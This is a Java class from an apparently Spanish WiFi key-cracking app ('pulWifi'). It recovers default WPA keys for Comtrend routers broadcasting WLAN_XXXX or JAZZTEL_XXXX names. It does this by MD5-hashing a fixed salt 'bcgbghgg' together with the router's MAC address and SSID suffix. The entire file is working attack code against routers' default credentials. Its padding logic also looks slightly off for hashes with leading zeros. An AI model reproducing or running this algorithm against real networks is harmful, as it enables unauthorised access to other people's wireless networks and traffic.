package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessEncryption;

public class Md5CAlgorithm extends CrackAlgorithm {

	/*
	 * MD5C algorithm.
	 * 
	 * TODO: Description and supported routers (COMTREND).
	 */

	public Md5CAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	// TODO: Add encryption and clean all up...
	public static WirelessEncryption[] encryption = {  };

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX
		// BSSID: 64:68:0C:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(64:68:0C:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 64:68:0C:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(64:68:0C:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 00:1B:20:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:1B:20:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:1B:20:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1B:20:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 00:1D:20:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:1D:20:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:1D:20:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1D:20:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 00:1A:2B:XX:XX:XX
		// TODO: Check (266 keys)...
		//addPattern("WLAN_([0-9a-fA-F]{4})", "(00:1A:2B:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:1A:2B:XX:XX:XX
		// TODO:  Check (266 keys)...
		//addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1A:2B:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 38:72:C0:XX:XX:XX
		// TODO: Check...
		//addPattern("WLAN_([0-9a-fA-F]{4})", "(38:72:C0:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 38:72:C0:XX:XX:XX
		// TODO: Check...
		//addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(38:72:C0:[0-9A-Fa-f:]{8})");
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		// TODO: Clean!
		bssid_data = bssid_data.replace(":", "").toUpperCase();
		return crack1(essid_data, bssid_data);
	}

	public static String crack1(String iESSID,String iBSSID){//WLAN_XXXX,JAZZTEL_XXXX
		String fijo = "bcgbghgg";
    	String ESSID = iESSID.toUpperCase();
    	String BSSID = "";
    	//Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la pasamos a mayúsculas
    	String[] aux = iBSSID.split(":");
    	for(String s:aux)BSSID+=s.toUpperCase();
    	//Log.d("pulWifi","Using MD5 algorythm (Comtrend)");
   		//Log.d("pulWifi", "ESSID -> "+ESSID);
   		//Log.d("pulWifi", "MAC -> "+BSSID);
   		String essid_fin = ESSID.substring(ESSID.length()-4,ESSID.length());
   		String principioBSSID = BSSID.substring(0,8);
   		String preMD5 = fijo+principioBSSID+essid_fin+BSSID;
   		//Log.d("pulWifi", "Cadena que se le pasa al MD5 -> "+preMD5);
   		String clave = getMD5(preMD5);
   		//w.setClave(clave);
  		//Log.d("pulWifi", "CLAVE -> "+clave);
   		return clave;
   	}

	private static String getMD5(String input) {
        try {
          //Log.d("pulWifi", "Calculando MD5...");
          MessageDigest md = MessageDigest.getInstance("MD5");
          byte[] messageDigest = md.digest(input.getBytes());
          BigInteger number = new BigInteger(1, messageDigest);
          String hashtext = number.toString(16);
          while (hashtext.length() < 20) {
              hashtext = "0" + hashtext;
          }
          return hashtext.substring(0, 20);
        }
        catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
      }

}
